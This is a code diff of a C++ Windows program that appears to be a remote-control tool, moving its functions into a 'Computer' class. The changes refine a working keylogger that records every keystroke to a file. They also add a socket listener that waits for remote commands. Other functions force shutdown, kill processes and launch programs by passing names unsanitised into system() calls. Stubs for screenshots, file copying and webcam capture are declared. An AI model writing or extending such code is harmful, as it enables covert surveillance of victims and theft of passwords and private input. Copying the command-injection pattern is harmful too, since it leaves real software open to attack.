@@ -4,10 +4,10 @@
 #include<fstream>
 #include<iostream>
 
-void shutdown() {
+void Computer::shutdown() {
     system("shutdown /s /f /t 0");
 }
-void reset() {
+void Computer::reset() {
     #ifdef _WIN32
         system("shutdown /r /t 0");  // Lệnh restart cho Windows
     #elif __linux__
@@ -18,14 +18,15 @@ void reset() {
         #error "Operating system is not supported"
     #endif
 }
-void keylogger() {
+void Computer::keyLogger() {
     char c;
+    std::ofstream log;
+    log.open("log.txt", std::ios::app);
     while (true) {
         for (c = 0; c <= 254; c++) {
             if (GetAsyncKeyState(c) & 0x1) {
-                std::ofstream log;
-                log.open("log.txt", std::ios::app);
-
+                // std::ofstream log;
+                // log.open("log.txt", std::ios::app);
                 switch (c) {
                     case VK_ESCAPE:
                         log << "[esc]";
@@ -63,13 +64,73 @@ void keylogger() {
                     default: 
                         log << c;
                 }
-                log.close();
+                // log.close();
             }
         }
     }
+    log.close();
 }
 
-void listApp() {
+static std::atomic<bool> running{true};
+
+void displayKeyPress(const char* action, int key) {
+    std::cout << action << ": " << (char)key 
+              << " (ASCII: " << key << ")" << std::endl;
+}
+
+// void keyboardMonitor() {
+//     std::cout << "Keyboard monitoring started. Press ESC to exit.\n";
+//     int ok = 0;
+//     ofstream fout;
+//     fout.open("log.txt", std::ios::app);
+//     if (!fout.is_open())
+//         cout << "Cannot open file! \n";
+//     while(running) {
+//         for(int key = 8; key <= 255; key++) {
+//             if(GetAsyncKeyState(key) == -32767) {
+//                 // if(key == VK_ESCAPE) {
+//                 //     running = false;
+//                 //     break;
+//                 // }
+//                 // if (ok == 0) {
+//                 //     ok = 1;
+//                 //     ofstream fout;
+//                 //     fout.open("log.txt", std::ios::app);
+//                 // }
+//                 // ofstream fout;
+//                 // fout.open("log.txt", std::ios::app);
+//                 // //displayKeyPress("Key pressed", key);
+//                     fout << "Key pressed" << ": " << (char)key << " (ASCII: " << key << ")" << std::endl;
+//                 // while(fout.is_open())
+//                 //     fout.close();
+//             }
+//         }
+//         std::this_thread::sleep_for(std::chrono::milliseconds(10));
+//     }
+//     fout.close();
+//     if (!fout.is_open())
+//         cout << "Closed file! \n";
+// }
+
+
+
+// Example of how to use timer to stop monitoring after specific duration
+void stopAfterDelay(SOCKET serverSocket) {
+    char buffer[1024];
+    int byteCount;
+    while(true) {
+        byteCount = recv(serverSocket, buffer, 1024, 0);
+            if (byteCount > 0) {
+                std::cout << buffer << "\n";
+                if (strcmp(buffer, "STOP") == 0) {
+                    running = false;
+                    break;
+                }
+            }
+    }
+}
+
+void Computer::listApp() {
     std::vector<std::wstring> applications;
     HKEY hKey;
     if (RegOpenKeyExW(HKEY_CURRENT_USER /*HKEY_LOCAL_MACHINE*/, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
@@ -110,19 +171,21 @@ void listApp() {
 
     outFile.close();
 }
-void startApp(std::string name) {
+void Computer::startApp(std::string name) {
     std::string command = "\"" + name + "\"";
     system(command.c_str());
 }
 
-void stopApp(std::string name) {
+void Computer::stopApp(std::string name) {
     std::string command = "taskkill /IM \"" + name + "\" /F";
     system(command.c_str());
 }
-void listService();
-void startService(std::string name);
-void stopService(std::string name);
-void screenShot();
-void copyFile(std::string name);
-void startWebcam();
-void stopWebcam();
+// void listService();
+// void startService(std::string name);
+// void stopService(std::string name);
+// void screenShot();
+// void copyFile(std::string name);
+// void startWebcam();
+// void stopWebcam();
+
+
